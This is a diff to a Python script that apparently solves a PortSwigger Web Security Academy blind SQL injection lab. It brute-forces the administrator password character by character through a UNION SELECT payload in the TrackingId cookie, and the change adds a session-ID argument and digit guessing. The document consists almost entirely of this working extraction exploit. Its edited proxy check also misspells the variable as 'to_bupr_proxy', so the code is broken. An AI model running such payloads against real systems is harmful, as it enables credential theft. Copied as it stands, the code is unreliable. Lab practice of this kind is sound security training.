@@ -6,10 +6,10 @@ from sys import argv
 packages.urllib3.disable_warnings() 
 
 def usage():
-    print(f"{__file__} <portswiggerURL> [to_burp_proxy]")
+    print(f"{__file__} <portswiggerURL> <session_id> [to_burp_proxy]")
     print("Examples:")
-    print(f"    {__file__} https://acef1f211f645ab480b369fd00670049.web-security-academy.net")
-    print(f"    {__file__} https://acef1f211f645ab480b369fd00670049.web-security-academy.net to_burp_proxy")
+    print(f"\t{__file__} https://acef1f211f645ab480b369fd00670049.web-security-academy.net aLqQRjXnIzZMk1YlCwD1HZl43WkJMBXC")
+    print(f"\t{__file__} https://acef1f211f645ab480b369fd00670049.web-security-academy.net aLqQRjXnIzZMk1YlCwD1HZl43WkJMBXC to_burp_proxy")
 
 proxy={
     "https" : "https://127.0.0.1:8080",
@@ -26,32 +26,34 @@ headers={
     "Upgrade-Insecure-Requests": "1"
 }
 
-def brute_force_password_character(url, to_burp_proxy=False):
+def brute_force_password_character(url, session_id, to_burp_proxy=False):
     password=""
     for i in range(1, 27):
-        for char in ascii_lowercase:
+        for char in ascii_lowercase+"0123456789":
             cookie={
                 "TrackingId": "xyz\' UNION SELECT 'a' FROM users WHERE username =" \
-                   f"'administrator' and SUBSTRING(password, {i}, 1) = '{char}'--; session=TjAltvk1sHu09kF1gyfeu1LXybsIbwgL"
+                   f"'administrator' AND SUBSTRING(password, {i}, 1) = '{char}'--; session={session_id}"
             }
-            if proxy == "proxy":
+            if to_bupr_proxy:
                 resp=get(url, headers=headers, cookies=cookie, proxies=proxy, verify=False)
             else:
                 resp=get(url, headers=headers, cookies=cookie, verify=False)
             if "Welcome" in resp.text:
-                print("Found Welcome Message!")
+                print(f"Found valid character: {char}")
                 password+=char
                 break
     return password 
 
 if __name__ == "__main__":
-    if len(argv) < 2:
+    if len(argv) < 3:
         usage()
-    elif len(argv) == 2:
-        url=argv[1]
-        password=brute_force_password_character(url)
-        print("Password :",  password)
     elif len(argv) == 3:
         url=argv[1]
-        password=brute_force_password_character(url, to_burp_proxy=True)
+        session_id=argv[2]
+        password=brute_force_password_character(url, session_id)
+        print("Password :",  password)
+    elif len(argv) == 4:
+        url=argv[1]
+        session_id=argv[2]
+        password=brute_force_password_character(url, session_id, to_burp_proxy=True)
         print("Password :",  password)
